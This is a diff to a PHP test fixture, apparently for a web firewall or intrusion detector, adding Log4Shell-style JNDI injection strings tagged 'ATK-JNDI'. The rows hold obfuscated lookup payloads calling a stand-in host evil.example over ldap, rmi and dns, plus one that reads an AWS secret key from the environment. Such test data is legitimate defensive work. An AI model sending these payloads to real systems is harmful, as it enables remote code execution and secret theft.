@@ -113,6 +113,9 @@ return [
             ['/', ['HTTP_USER_AGENT' => '${${upper:j}${upper:n}di:rmi://evil.example/x}'], 'ATK-JNDI'],
             ['/?a=${${env:NaN:-j}ndi:dns://evil.example/x}', [], 'ATK-JNDI'],
             ['/?a=${ctx:loginId}', [], 'ATK-JNDI'],
+            ['/?a=${${base64:am5kaQ==}:ldap://evil.example/x}', [], 'ATK-JNDI'],
+            ['/?a=${j${::-n}di:ldap://evil.example/x}', [], 'ATK-JNDI'],
+            ['/?q=${a ${b}', [], 'ATK-JNDI'],                                      // the price: a ${ before the first one closes
             ['/?a=${env:AWS_SECRET_ACCESS_KEY}', [], 'ATK-JNDI'],
             ['/${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
             ['/', ['HTTP_X_FORWARDED_FOR' => '${jndi:ldap://evil.example/x}'], 'ATK-JNDI'],
